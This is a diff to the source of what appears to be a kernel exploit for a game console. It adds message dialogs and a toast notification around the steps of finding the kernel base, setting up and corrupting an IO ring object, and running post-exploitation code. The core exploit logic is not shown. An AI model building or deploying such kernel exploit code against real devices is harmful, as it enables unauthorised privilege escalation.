@@ -9,6 +9,7 @@
 
 #include "ioring.h"
 #include "nt_offsets.h"
+#include "winrt.h"
 
 // socket stuff
 WSADATA wsaData;
@@ -473,6 +474,11 @@ int main(int argc, char** argv)
     {
         cur_msg = "Failed to find kernel base! Reboot your console and try again.\n";
         send(winSock, cur_msg, strlen(cur_msg), 0);
+        show_message_dialog(
+            L"Exploit failed",
+            L"Was only able to cause a tiny bit of damage (Kernel base not found).\n\n"
+            L"For the possibility of COLLATERAL DAMAGE, reboot the console and execute the exploit again!"
+        );
         exit(0);
         return 0;
     }
@@ -491,6 +497,11 @@ int main(int argc, char** argv)
     {
         cur_msg = "Exploit failed! Reboot your console and try again.\n";
         send(winSock, cur_msg, strlen(cur_msg), 0);
+        show_message_dialog(
+            L"Exploit failed",
+            L"Was only able to cause a tiny bit of damage (Exploit failed).\n\n"
+            L"For the possibility of COLLATERAL DAMAGE, reboot the console and execute the exploit again!"
+        );
         exit(0);
         return 0;
     }
@@ -502,6 +513,11 @@ int main(int argc, char** argv)
     {
         sprintf_s(ptr_msg, sizeof(ptr_msg), "IO Ring setup failed. Result: %i\nReboot your console and try again.\n", res);
         send(winSock, ptr_msg, strlen(ptr_msg), 0);
+        show_message_dialog(
+            L"Exploit failed",
+            L"Was only able to cause a tiny bit of damage (IO Ring setup).\n\n"
+            L"For the possibility of COLLATERAL DAMAGE, reboot the console and execute the exploit again!"
+        );
     }
 
     // Corrupt the IO ring object
@@ -512,6 +528,7 @@ int main(int argc, char** argv)
     cur_msg = "Exploit succeeded! Running payload!\n\n";
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
+    show_toast();
     // Run our post-exploitation code
     post_exploit(winSock);
     
